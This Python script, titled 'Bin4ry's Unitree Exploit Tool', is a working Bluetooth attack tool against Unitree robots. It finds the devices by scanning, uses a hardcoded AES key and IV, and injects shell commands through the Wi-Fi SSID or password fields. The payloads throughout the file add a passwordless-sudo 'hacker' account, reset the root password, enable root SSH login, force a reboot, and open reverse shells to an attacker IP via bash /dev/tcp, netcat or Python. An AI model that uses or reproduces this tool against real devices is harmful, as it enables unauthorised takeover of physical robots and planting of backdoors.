#!/usr/bin/env python3

import asyncio
import argparse
from bleak import BleakScanner, BleakClient
from Crypto.Cipher import AES
import platform
import sqlite3
from datetime import datetime
import os

# UUIDs
DEVICE_NAME_UUID =      "00002a00-0000-1000-8000-00805f9b34fb"
CUSTOM_CHAR_UUID =      "0000ffe1-0000-1000-8000-00805f9b34fb"
CUSTOM_CHAR_UUID_2 =    "0000ffe2-0000-1000-8000-00805f9b34fb"
UNITREE_SERVICE_UUID =  "0000ffe0-0000-1000-8000-00805f9b34fb"

COUNTRY_CODE = "US"
HANDSHAKE_CONTENT = "unitree"
AES_KEY = bytes.fromhex("df98b715d5c6ed2b25817b6f2554124a")
AES_IV = bytes.fromhex("2841ae97419c2973296a0d4bdfe19a4f")
chunk_size = 14

PREDEFINED_CMDS = {
    "enable_ssh": r"useradd -m -s /bin/bash hacker 2>/dev/null || true; echo 'hacker:Bin4ryWasHere' | chpasswd; echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers; echo 'root:Bin4ryWasHere' | chpasswd; sed -i 's/^#*\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config; /etc/init.d/ssh restart 2>/dev/null || /etc/init.d/sshd restart 2>/dev/null || service ssh restart 2>/dev/null || systemctl restart ssh 2>/dev/null",
    "reboot": "reboot -f",
    "echo_test": "mkdir -p \"$HOME\" && echo 'EchoSec was here' > \"$HOME/EchoSec.txt\"",
    "rev_shell": "DYNAMIC"
}

VERBOSE = False
DB_PATH = "unitree_devices.db"

def styled_print(message, verbose_only=False):
    if verbose_only and not VERBOSE:
        return
    prefix = "\033[1;32m[//]\033[0m "
    print(f"{prefix}{message}")

# Database functions
def init_db():
    """Initialize SQLite database for storing device history."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (address TEXT PRIMARY KEY, name TEXT, last_used TEXT)''')
    conn.commit()
    conn.close()

def save_device(device):
    """Save or update device in database with current timestamp."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute('''INSERT OR REPLACE INTO devices (address, name, last_used)
                 VALUES (?, ?, ?)''', (device.address, device.name, timestamp))
    c.execute('''DELETE FROM devices WHERE address NOT IN (
                 SELECT address FROM devices ORDER BY last_used DESC LIMIT 5)''')
    conn.commit()
    conn.close()

def list_recent_devices():
    """List the last 5 devices used."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT address, name, last_used FROM devices
                 ORDER BY last_used DESC LIMIT 5''')
    devices = c.fetchall()
    conn.close()
    return devices

def build_pwn(cmd):
    # Método mais robusto de injeção - usando múltiplas técnicas
    # Tenta diferentes formatos de injeção para aumentar compatibilidade
    # Limita o tamanho do comando para evitar problemas de buffer
    if len(cmd) > 100:
        styled_print("[!] Warning: Command is long and may cause issues", verbose_only=False)
    return f'";{cmd};#'

def encrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV, segment_size=128)
    return cipher.encrypt(data)

def decrypt_data(data):
    cipher = AES.new(AES_KEY, AES.MODE_CFB, iv=AES_IV, segment_size=128)
    return cipher.decrypt(data)

async def find_robot(timeout: float = 30.0):
    styled_print("Initiating scan for Unitree robots…")
    scanner_kwargs = {
        "scanning_mode": "active",
    }
    if platform.system() == "Linux":
        scanner_kwargs["bluez"] = {"device_filter": "hci0"}
    
    devices_adv = await BleakScanner.discover(
        timeout=timeout,
        return_adv=True,
        **scanner_kwargs
    )
    compatible = []
    for device, adv in devices_adv.values():
        if device.name and device.name.startswith(("G1_", "Go2_", "B2_","H1_", "X1_")):
            styled_print(f"Found: {device.name} ({device.address})", verbose_only=True)
            compatible.append(device)
    
    if not compatible:
        styled_print("[-] No Unitree robots detected.", verbose_only=False)
        return None
    
    styled_print(f"Detected {len(compatible)} compatible device(s)", verbose_only=False)
    return compatible

def create_packet(instruction, data_bytes=None):
    instruction_data = [instruction]
    if data_bytes:
        instruction_data.extend(data_bytes)
    length = len(instruction_data) + 3
    full_data = [0x52, length] + instruction_data
    checksum = -sum(full_data) & 0xFF
    plain_data = full_data + [checksum]
    return encrypt_data(bytes(plain_data))

def generic_response_validator(response, expected_instruction):
    if len(response) < 5:
        styled_print("[-] Response packet corrupted: too short", verbose_only=False)
        return False
    if response[0] != 0x51:
        styled_print("[-] Invalid opcode in response", verbose_only=False)
        return False
    if len(response) != response[1]:
        styled_print("[-] Packet length mismatch", verbose_only=False)
        return False
    if response[2] != expected_instruction:
        styled_print(f"[-] Instruction mismatch: Expected {expected_instruction}, Got {response[2]}", verbose_only=False)
        return False
    expected_checksum = -sum(response[:-1]) & 0xFF
    if response[-1] != expected_checksum:
        styled_print(f"[-] Checksum failure: Expected {hex(expected_checksum)}, Got {hex(response[-1])}", verbose_only=False)
        return False
    return response[3] == 0x01

async def wait_for_notification(event, received_value, validator, timeout=15.0):  # Aumentado timeout
    try:
        await asyncio.wait_for(event.wait(), timeout)
        if validator(received_value[0]):
            styled_print("Packet validated successfully", verbose_only=True)
            return received_value[0]
        else:
            styled_print("[-] Packet validation failed", verbose_only=False)
            raise ValueError("Invalid notification")
    except asyncio.TimeoutError:
        styled_print("[-] Timeout: No packet received from target", verbose_only=False)
        raise

async def connect_and_configure_wifi(device, handshake_content, ssid, password, country_code, retries=5):  # Aumentado retries
    for attempt in range(retries):
        try:
            # Se falhou antes, faz um novo scan rápido para pegar o dispositivo atualizado
            if attempt > 0:
                styled_print(f"Attempt {attempt + 1}/{retries}: Rescanning for device {device.name}...", verbose_only=False)
                await asyncio.sleep(2.0)  # Aguarda antes de rescan
                devices = await find_robot(timeout=15.0)
                if devices:
                    # Procura o mesmo dispositivo pelo nome
                    for d in devices:
                        if d.name == device.name:
                            device = d
                            styled_print(f"Device relocated: {device.address}", verbose_only=False)
                            break
                    else:
                        styled_print(f"[-] Device {device.name} not found in rescan", verbose_only=False)
                        if attempt + 1 < retries:
                            styled_print("Trying with original address anyway...", verbose_only=False)
            
            styled_print(f"Connecting to {device.name} ({device.address})...", verbose_only=True)
            # Adiciona delay antes da conexão para estabilização
            if attempt > 0:
                await asyncio.sleep(1.0)
            async with BleakClient(device.address, timeout=45.0) as client:  # Aumentado timeout de conexão
                notification_event = asyncio.Event()
                received_value = [None]
                serial_chunks = {}

                async def notification_handler(sender, data):
                    decrypted_value = decrypt_data(data)
                    if len(decrypted_value) < 5 or decrypted_value[0] != 0x51:
                        styled_print("[-] Corrupted notification packet", verbose_only=False)
                        return
                    response_type = decrypted_value[2]
                    if response_type == 0x02:
                        chunk_index = decrypted_value[3]
                        total_chunks = decrypted_value[4]
                        chunk_data = decrypted_value[5:-1]
                        serial_chunks[chunk_index] = chunk_data
                        if len(serial_chunks) == total_chunks:
                            serial_number = b"".join(serial_chunks[i] for i in sorted(serial_chunks.keys()))
                            serial_number_str = serial_number.decode('utf-8').rstrip('\x00')
                            styled_print(f"Serial number extracted: {serial_number_str}", verbose_only=False)
                            serial_chunks.clear()
                            notification_event.set()
                    else:
                        received_value[0] = decrypted_value
                        notification_event.set()

                try:
                    await client.start_notify(CUSTOM_CHAR_UUID, notification_handler)
                    styled_print("[+] Notification handler registered", verbose_only=True)
                except Exception as e:
                    styled_print(f"[-] Primary notification setup failed: {e}", verbose_only=True)
                    styled_print("[!] Attempting alternate notification method...", verbose_only=False)
                    try:
                        await client.start_notify(13, notification_handler)
                        styled_print("[+] Alternate notification handler registered (handle 13)", verbose_only=True)
                    except Exception as e2:
                        styled_print(f"[-] Alternate method also failed: {e2}", verbose_only=False)
                        raise Exception("Unable to setup notification handler")

                styled_print(f"[*] Starting configuration process...", verbose_only=False)
                styled_print(f"Transmitting handshake: {handshake_content}", verbose_only=True)
                handshake_bytes = handshake_content.encode('utf-8')
                handshake_packet = create_packet(instruction=1, data_bytes=[0, 0] + list(handshake_bytes))
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, handshake_packet, response=True)
                await wait_for_notification(notification_event, received_value,
                                          lambda r: generic_response_validator(r, expected_instruction=1))
                notification_event.clear()
                styled_print("[+] Handshake successful", verbose_only=False)

                styled_print("[*] Retrieving device serial number...", verbose_only=False)
                serial_packet = create_packet(instruction=2, data_bytes=[0])
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, serial_packet, response=True)
                await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                notification_event.clear()

                styled_print("[*] Initializing network interface...", verbose_only=False)
                init_packet = create_packet(instruction=3, data_bytes=[2])
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, init_packet, response=True)
                await wait_for_notification(notification_event, received_value,
                                          lambda r: generic_response_validator(r, expected_instruction=3))
                notification_event.clear()
                styled_print("[+] Network interface ready", verbose_only=False)

                styled_print(f"[*] Uploading SSID: {ssid}", verbose_only=False)
                ssid_bytes = ssid.encode('utf-8')
                total_chunks = (len(ssid_bytes) + chunk_size - 1) // chunk_size
                for i in range(total_chunks):
                    start = i * chunk_size
                    chunk = ssid_bytes[start:start + chunk_size]
                    packet = create_packet(instruction=4, data_bytes=[i + 1, total_chunks] + list(chunk))
                    await client.write_gatt_char(CUSTOM_CHAR_UUID_2, packet, response=True)
                    await asyncio.sleep(0.05)  # Pequeno delay entre chunks
                    if i + 1 == total_chunks:
                        await wait_for_notification(notification_event, received_value,
                                                  lambda r: generic_response_validator(r, expected_instruction=4))
                        notification_event.clear()
                styled_print("[+] SSID uploaded successfully", verbose_only=False)

                styled_print(f"[*] Uploading password with payload...", verbose_only=False)
                styled_print(f"Password length: {len(password)} bytes", verbose_only=True)
                pass_bytes = password.encode('utf-8')
                total_chunks = (len(pass_bytes) + chunk_size - 1) // chunk_size
                styled_print(f"Will send {total_chunks} chunk(s)", verbose_only=True)
                for i in range(total_chunks):
                    start = i * chunk_size
                    chunk = pass_bytes[start:start + chunk_size]
                    packet = create_packet(instruction=5, data_bytes=[i + 1, total_chunks] + list(chunk))
                    styled_print(f"Sending chunk {i+1}/{total_chunks}", verbose_only=True)
                    await client.write_gatt_char(CUSTOM_CHAR_UUID_2, packet, response=True)
                    await asyncio.sleep(0.3)  # Delay maior para comandos complexos
                    if i + 1 == total_chunks:
                        await wait_for_notification(notification_event, received_value,
                                                  lambda r: generic_response_validator(r, expected_instruction=5),
                                                  timeout=15.0)  # Timeout maior para processamento
                        notification_event.clear()
                styled_print("[+] Password and payload uploaded successfully", verbose_only=False)

                styled_print(f"[*] Setting region code: {country_code}", verbose_only=False)
                country_code_bytes = country_code.encode('utf-8') + b'\x00'
                country_packet = create_packet(instruction=6, data_bytes=[1] + list(country_code_bytes))
                await client.write_gatt_char(CUSTOM_CHAR_UUID_2, country_packet, response=True)
                await wait_for_notification(notification_event, received_value,
                                          lambda r: generic_response_validator(r, expected_instruction=6))
                notification_event.clear()
                styled_print("[+] Region configured", verbose_only=False)

                styled_print("[+] Configuration completed successfully!", verbose_only=False)
                save_device(device)
                return
        except asyncio.TimeoutError as e:
            error_msg = "Connection timeout"
            styled_print(f"[-] Attempt {attempt + 1}/{retries} failed: {error_msg}", verbose_only=False)
            styled_print("[-] The device may be too far or experiencing interference", verbose_only=False)
        except Exception as e:
            error_msg = str(e)
            styled_print(f"[-] Attempt {attempt + 1}/{retries} failed: {error_msg}", verbose_only=False)
            
            # Diagnóstico adicional
            if "not found" in error_msg.lower():
                styled_print("[-] Device disappeared. It may have gone to sleep or moved out of range.", verbose_only=False)
                styled_print("[-] Tip: Keep the device active and close to the adapter.", verbose_only=False)
            elif "timeout" in error_msg.lower():
                styled_print("[-] Tip: Try moving closer to the device", verbose_only=False)
            elif "0x0e" in error_msg or "unlikely error" in error_msg.lower():
                styled_print("[-] ATT error detected. The device may be busy or rejecting connections.", verbose_only=False)
                styled_print("[-] Tip: Wait a moment and ensure no other devices are connected.", verbose_only=False)
            elif "bluez" in error_msg.lower():
                styled_print("[-] Bluetooth system error detected.", verbose_only=False)
                styled_print("[-] Tip: Try 'sudo systemctl restart bluetooth' or 'sudo hciconfig hci0 reset'", verbose_only=False)
            
            if attempt + 1 < retries:
                wait_time = min(5, 2 * (attempt + 1))  # Limita tempo máximo de espera
                styled_print(f"Waiting {wait_time} seconds before retry...", verbose_only=False)
                await asyncio.sleep(wait_time)
            else:
                styled_print("[-] All connection attempts exhausted.", verbose_only=False)
                styled_print("[!] Troubleshooting tips:", verbose_only=False)
                styled_print("    1. Ensure the device is powered on and in pairing mode", verbose_only=False)
                styled_print("    2. Move closer to the device (within 3 meters)", verbose_only=False)
                styled_print("    3. Check if Bluetooth is enabled: 'hciconfig'", verbose_only=False)
                styled_print("    4. Reset Bluetooth: 'sudo hciconfig hci0 reset'", verbose_only=False)
                styled_print("    5. Try a different Bluetooth adapter if available", verbose_only=False)
                raise

async def select_device():
    """Allow user to select a device from recent devices or scan for new ones."""
    recent_devices = list_recent_devices()
    
    if recent_devices:
        styled_print("Recent devices:", verbose_only=False)
        for i, (address, name, last_used) in enumerate(recent_devices, 1):
            styled_print(f"  {i}. {name} ({address}) - Last used: {last_used}", verbose_only=False)
        styled_print(f"  {len(recent_devices) + 1}. Scan for new devices", verbose_only=False)
        
        while True:
            try:
                choice = int(input("\033[1;32m[//] Select device (1-{}): \033[0m".format(len(recent_devices) + 1)))
                if 1 <= choice <= len(recent_devices):
                    address, name, _ = recent_devices[choice - 1]
                    styled_print(f"Attempting to reconnect to {name}...", verbose_only=False)
                    
                    # Faz um scan rápido para encontrar o dispositivo atualizado
                    styled_print("Scanning for device...", verbose_only=True)
                    devices = await find_robot(timeout=15.0)
                    
                    if devices:
                        # Procura o dispositivo pelo nome
                        for d in devices:
                            if d.name == name:
                                styled_print(f"Device found: {d.name} ({d.address})", verbose_only=True)
                                return d
                        
                        # Se não encontrou pelo nome, mas encontrou outros dispositivos
                        styled_print(f"[-] {name} not found in current scan.", verbose_only=False)
                        styled_print(f"Found {len(devices)} other device(s). Use one of them? (y/n): ", verbose_only=False)
                        if input().lower() == 'y':
                            return devices[0]
                    
                    # Se não encontrou nenhum dispositivo
                    styled_print(f"[-] Could not locate {name}. Try scanning for new devices.", verbose_only=False)
                    continue
                    
                elif choice == len(recent_devices) + 1:
                    devices = await find_robot(timeout=30.0)
                    if not devices:
                        return None
                    
                    if len(devices) == 1:
                        return devices[0]
                    
                    # Se encontrou múltiplos dispositivos, deixa o usuário escolher
                    styled_print("Multiple devices found:", verbose_only=False)
                    for i, d in enumerate(devices, 1):
                        styled_print(f"  {i}. {d.name} ({d.address})", verbose_only=False)
                    
                    while True:
                        try:
                            dev_choice = int(input("\033[1;32m[//] Select device (1-{}): \033[0m".format(len(devices))))
                            if 1 <= dev_choice <= len(devices):
                                return devices[dev_choice - 1]
                            styled_print("[-] Invalid selection.", verbose_only=False)
                        except ValueError:
                            styled_print("[-] Input error. Enter a valid number.", verbose_only=False)
                else:
                    styled_print("[-] Invalid selection.", verbose_only=False)
            except ValueError:
                styled_print("[-] Input error. Enter a valid number.", verbose_only=False)
    else:
        styled_print("No recent devices found. Scanning for new devices...", verbose_only=False)
        devices = await find_robot(timeout=30.0)
        if not devices:
            return None
        
        if len(devices) == 1:
            return devices[0]
        
        # Se encontrou múltiplos dispositivos
        styled_print("Multiple devices found:", verbose_only=False)
        for i, d in enumerate(devices, 1):
            styled_print(f"  {i}. {d.name} ({d.address})", verbose_only=False)
        
        while True:
            try:
                choice = int(input("\033[1;32m[//] Select device (1-{}): \033[0m".format(len(devices))))
                if 1 <= choice <= len(devices):
                    return devices[choice - 1]
                styled_print("[-] Invalid selection.", verbose_only=False)
            except ValueError:
                styled_print("[-] Input error. Enter a valid number.", verbose_only=False)

async def main(ssid, password, cmd):
    device = await select_device()
    if not device:
        styled_print("[-] No device selected or found.", verbose_only=False)
        return
    await connect_and_configure_wifi(device, HANDSHAKE_CONTENT, ssid, password, COUNTRY_CODE)

def get_reverse_shell_cmd():
    """Get reverse shell command with user-specified IP and port."""
    styled_print("Reverse Shell Configuration:", verbose_only=False)
    styled_print("Make sure you have a listener running (nc -lvnp PORT)", verbose_only=False)
    
    while True:
        attacker_ip = input("\033[1;32m[//] Enter your IP address (listener): \033[0m")
        if attacker_ip.strip():
            break
        styled_print("[-] IP address cannot be empty.", verbose_only=False)
    
    while True:
        try:
            attacker_port = input("\033[1;32m[//] Enter port (default: 9001): \033[0m") or "9001"
            port = int(attacker_port)
            if 1 <= port <= 65535:
                break
            styled_print("[-] Port must be between 1-65535.", verbose_only=False)
        except ValueError:
            styled_print("[-] Invalid port number.", verbose_only=False)
    
    # Ask for delay before executing the reverse shell
    styled_print("\n[!] WiFi configuration takes time. The device needs to:", verbose_only=False)
    styled_print("    1. Process the WiFi credentials", verbose_only=False)
    styled_print("    2. Connect to the network", verbose_only=False)
    styled_print("    3. Obtain an IP address", verbose_only=False)
    styled_print("    4. Then execute the reverse shell", verbose_only=False)
    
    while True:
        try:
            delay_input = input("\033[1;32m[//] Delay before reverse shell execution in seconds (default: 10): \033[0m") or "10"
            delay = int(delay_input)
            if 0 <= delay <= 60:
                break
            styled_print("[-] Delay must be between 0-60 seconds.", verbose_only=False)
        except ValueError:
            styled_print("[-] Invalid delay value.", verbose_only=False)
    
    styled_print("\nSelect reverse shell variant:", verbose_only=False)
    styled_print("  1. bash -i (most compatible)", verbose_only=False)
    styled_print("  2. sh with /dev/tcp (shorter)", verbose_only=False)
    styled_print("  3. netcat (if available)", verbose_only=False)
    styled_print("  4. python (if available)", verbose_only=False)
    styled_print("  5. nc without -e (alternative netcat)", verbose_only=False)
    styled_print("  6. telnet (if nc not available)", verbose_only=False)
    
    while True:
        try:
            variant = int(input("\033[1;32m[//] Select variant (1-4): \033[0m") or "1")
            if variant == 1:
                # Mais compatível, usa bash
                base_cmd = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1'"
            elif variant == 2:
                # Versão curta com sh
                base_cmd = f"sh -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
            elif variant == 3:
                # Usa netcat se disponível
                base_cmd = f"nc {attacker_ip} {port} -e /bin/sh"
            elif variant == 4:
                # Python one-liner (mais longo mas funciona se python estiver disponível)
                base_cmd = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"sh\"])'"
            else:
                styled_print("[-] Invalid selection. Choose 1-4.", verbose_only=False)
                continue
            break
        except ValueError:
            styled_print("[-] Invalid input.", verbose_only=False)
    
    # Ask if should run in background
    styled_print("\n[!] Running in background prevents the device from blocking", verbose_only=False)
    run_background = input("\033[1;32m[//] Run reverse shell in background? (y/N): \033[0m").lower() == 'y'
    
    # Build the final command with delay and background options
    if delay > 0:
        if run_background:
            # Use nohup and background execution with delay
            # The parentheses create a subshell that can run independently
            cmd = f"(sleep {delay} && {base_cmd}) > /dev/null 2>&1 &"
            styled_print(f"[+] Command will run in background after {delay}s delay", verbose_only=False)
            styled_print("[+] Output redirected to /dev/null to avoid blocking", verbose_only=False)
        else:
            cmd = f"sleep {delay} && {base_cmd}"
            styled_print(f"[+] Added {delay} second delay before reverse shell execution", verbose_only=False)
    else:
        if run_background:
            cmd = f"{base_cmd} > /dev/null 2>&1 &"
            styled_print("[+] Command will run in background immediately", verbose_only=False)
            styled_print("[+] Output redirected to /dev/null to avoid blocking", verbose_only=False)
        else:
            cmd = base_cmd
    
    styled_print(f"Generated reverse shell command: {cmd}", verbose_only=True)
    styled_print(f"\n[*] Timeline:", verbose_only=False)
    styled_print(f"    0s: WiFi configuration starts", verbose_only=False)
    styled_print(f"    ~5s: Device connects to WiFi", verbose_only=False)
    styled_print(f"    {delay}s: Reverse shell executes", verbose_only=False)
    styled_print(f"\n[*] Listener command: nc -lvnp {port}", verbose_only=False)
    styled_print(f"[!] Make sure your listener is running BEFORE the device executes the command!", verbose_only=False)
    return cmd

def get_user_input(args):
    if args.enable_ssh or args.reboot:
        cmd_name = "enable_ssh" if args.enable_ssh else "reboot"
        cmd = PREDEFINED_CMDS[cmd_name]
        styled_print(f"Selected payload: {cmd_name}", verbose_only=False)
        if cmd_name == "enable_ssh":
            styled_print("SSH will be enabled with the following accounts:", verbose_only=False)
            styled_print("  - User: hacker | Password: Bin4ryWasHere (sudoer with NOPASSWD)", verbose_only=False)
            styled_print("  - User: root   | Password: Bin4ryWasHere", verbose_only=False)
        if args.wifi_ssid and args.wifi_pwd:
            ssid = args.wifi_ssid
            password = args.wifi_pwd + build_pwn(cmd)
            styled_print(f"Using Wi-Fi SSID: {ssid}", verbose_only=False)
            styled_print(f"Injected payload: {build_pwn(cmd)}", verbose_only=True)
            styled_print(f"Full password field: {password}", verbose_only=True)
        else:
            ssid = build_pwn(cmd)
            password = ""
            styled_print("No Wi-Fi credentials provided; injecting command as SSID", verbose_only=False)
            styled_print(f"Injected SSID: {ssid}", verbose_only=True)
        return ssid, password, cmd

    styled_print("Select operation mode:", verbose_only=False)
    styled_print("  1. Run command only (injected via SSID)", verbose_only=False)
    styled_print("  2. Run command and configure Wi-Fi (command appended to password)", verbose_only=False)
    styled_print("  3. Configure Wi-Fi credentials only (no command injection)", verbose_only=False)

    while True:
        try:
            mode_choice = int(input("\033[1;32m[//] Select mode (1-3): \033[0m"))
            if mode_choice in [1, 2, 3]:
                break
            styled_print("[-] Invalid selection. Choose 1, 2, or 3.", verbose_only=False)
        except ValueError:
            styled_print("[-] Input error. Enter a valid number (1, 2, or 3).", verbose_only=False)

    if mode_choice == 3:
        while True:
            ssid = input("\033[1;32m[//] Enter Wi-Fi SSID: \033[0m")
            password = input("\033[1;32m[//] Enter Wi-Fi Password: \033[0m")
            if ssid.strip() and password.strip():
                styled_print(f"Configuring Wi-Fi with SSID: {ssid}", verbose_only=False)
                return ssid, password, None
            styled_print("[-] SSID and password cannot be empty.", verbose_only=False)

    styled_print("Available payloads:", verbose_only=False)
    for i, cmd_name in enumerate(PREDEFINED_CMDS.keys(), 1):
        styled_print(f"  {i}. {cmd_name}", verbose_only=False)
    styled_print(f"  {len(PREDEFINED_CMDS) + 1}. Custom payload", verbose_only=False)

    while True:
        try:
            choice = int(input("\033[1;32m[//] Select payload (1-{}): \033[0m".format(len(PREDEFINED_CMDS) + 1)))
            if 1 <= choice <= len(PREDEFINED_CMDS):
                cmd_name = list(PREDEFINED_CMDS.keys())[choice - 1]
                if cmd_name == "rev_shell":
                    cmd = get_reverse_shell_cmd()
                else:
                    cmd = PREDEFINED_CMDS[cmd_name]
                styled_print(f"Selected payload: {cmd_name}", verbose_only=False)
                if cmd_name == "enable_ssh":
                    styled_print("SSH will be enabled with the following accounts:", verbose_only=False)
                    styled_print("  - User: hacker | Password: Bin4ryWasHere (sudoer with NOPASSWD)", verbose_only=False)
                    styled_print("  - User: root   | Password: Bin4ryWasHere", verbose_only=False)
            elif choice == len(PREDEFINED_CMDS) + 1:
                cmd = input("\033[1;32m[//] Enter custom payload: \033[0m")
                styled_print(f"Selected custom payload: {cmd}", verbose_only=False)
            else:
                styled_print(f"[-] Invalid payload selection. Choose between 1 and {len(PREDEFINED_CMDS) + 1}.", verbose_only=False)
                continue
            break
        except ValueError:
            styled_print("[-] Input error. Enter a valid payload number.", verbose_only=False)

    if mode_choice == 1:
        ssid = build_pwn(cmd)
        password = ""
        styled_print("Command will be injected via SSID", verbose_only=False)
        styled_print(f"Injected SSID: {ssid}", verbose_only=True)
    else:
        while True:
            ssid = input("\033[1;32m[//] Enter Wi-Fi SSID: \033[0m")
            password = input("\033[1;32m[//] Enter Wi-Fi Password: \033[0m")
            if ssid.strip() and password.strip():
                password = password + build_pwn(cmd)
                styled_print(f"Using Wi-Fi SSID: {ssid}", verbose_only=False)
                styled_print(f"Injected payload: {build_pwn(cmd)}", verbose_only=True)
                styled_print(f"Full password field: {password}", verbose_only=True)
                break
            styled_print("[-] SSID and password cannot be empty.", verbose_only=False)
            styled_print("Falling back to command-only mode? (y/n): ", verbose_only=False)
            if input().lower() == 'y':
                ssid = build_pwn(cmd)
                password = ""
                styled_print("Command will be injected via SSID", verbose_only=False)
                styled_print(f"Injected SSID: {ssid}", verbose_only=True)
                break

    return ssid, password, cmd

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Bin4ry's Unitree Go2 and G1 Infiltration Tool")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--enable-ssh", action="store_true", help="Quick select enable_ssh command")
    parser.add_argument("--reboot", action="store_true", help="Quick select reboot command")
    parser.add_argument("--wifi-ssid", type=str, help="Wi-Fi SSID to use for connection")
    parser.add_argument("--wifi-pwd", type=str, help="Wi-Fi password to use for connection")
    args = parser.parse_args()

    if args.enable_ssh and args.reboot:
        styled_print("[-] Error: Cannot use both --enable-ssh and --reboot simultaneously.", verbose_only=False)
        exit(1)
    if (args.wifi_ssid or args.wifi_pwd) and not (args.enable_ssh or args.reboot):
        styled_print("[-] Error: --wifi-ssid and --wifi-pwd require either --enable-ssh or --reboot.", verbose_only=False)
        exit(1)
    if (args.wifi_ssid and not args.wifi_pwd) or (args.wifi_pwd and not args.wifi_ssid):
        styled_print("[-] Error: Both --wifi-ssid and --wifi-pwd must be provided together.", verbose_only=False)
        exit(1)

    VERBOSE = args.verbose
    init_db()

    print("\033[1;32m")
    print("+========================================+")
    print("|   Bin4ry's Unitree Exploit Tool (v2.6) |")
    print("| supported devices: Go2, G1, H1, B2 ... |")
    print("+========================================+")
    print("  Shouts to h0stile, legion1581")
    print("            8th May 2025")
    print("  Updated: 25th Sep 2025")
    print("\033[0m")

    try:
        ssid, password, cmd = get_user_input(args)
        asyncio.run(main(ssid, password, cmd))
    except KeyboardInterrupt:
        styled_print("[-] Operation aborted by operator.", verbose_only=False)
    except Exception as e:
        styled_print(f"[-] Critical failure: {e}", verbose_only=False)
